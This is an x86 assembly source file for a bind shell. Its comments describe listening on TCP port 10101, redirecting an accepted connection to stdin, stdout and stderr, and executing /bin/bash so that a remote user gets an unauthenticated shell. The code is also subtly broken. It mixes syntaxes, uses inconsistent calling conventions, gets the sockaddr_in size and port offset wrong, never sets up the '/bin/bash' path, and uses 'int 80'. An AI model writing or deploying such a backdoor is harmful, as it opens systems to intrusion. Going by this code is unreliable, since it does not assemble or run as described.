; Declare global variables in .bss section
.section .bss
    sin: .space 12 ; Size of sockaddr_in struct

; Declare global variables in .data section
.section .data
    sock: .long 0    ; Socket descriptor
    fd: .long 0     ; File descriptor for accepted connection

; Declare global variables in .text section
.section .text
    .global main

main:
    ; Create a TCP socket
    push AF_INET
    push SOCK_STREAM
    push IPPROTO_TCP
    call socket
    mov sock, eax

    ; Set socket family to AF_INET
    mov sin, eax
    mov eax, AF_INET
    mov [sin + 0], eax

    ; Set socket port to 10101
    mov eax, 10101
    call htons
    mov [sin + 4], eax

    ; Bind the socket to the address
    mov eax, sock
    mov ebx, sin
    mov ecx, 12 ; Size of sockaddr_in struct
    call bind

    ; Listen on the socket for connections
    mov eax, sock
    mov ecx, 1 ; Maximum number of pending connections
    call listen

    ; Accept a connection
    mov eax, sock
    mov ebx, NULL
    mov ecx, NULL
    call accept
    mov fd, eax

    ; Duplicate file descriptor for stdin
    mov eax, fd
    mov ebx, 0 ; Standard input file descriptor
    call dup2

    ; Duplicate file descriptor for stdout
    mov eax, fd
    mov ebx, 1 ; Standard output file descriptor
    call dup2

    ; Duplicate file descriptor for stderr
    mov eax, fd
    mov ebx, 2 ; Standard error file descriptor
    call dup2

    ; Execute the /bin/bash program with the accepted connection as its standard input, output, and error
    mov ebx, [esp + 4] ; Pointer to the first argument (program name)
    push 0 ; NULL-terminated argument list
    call execve

    ; Exit if execve fails
    mov eax, 1
    mov ebx, 0
    int 80
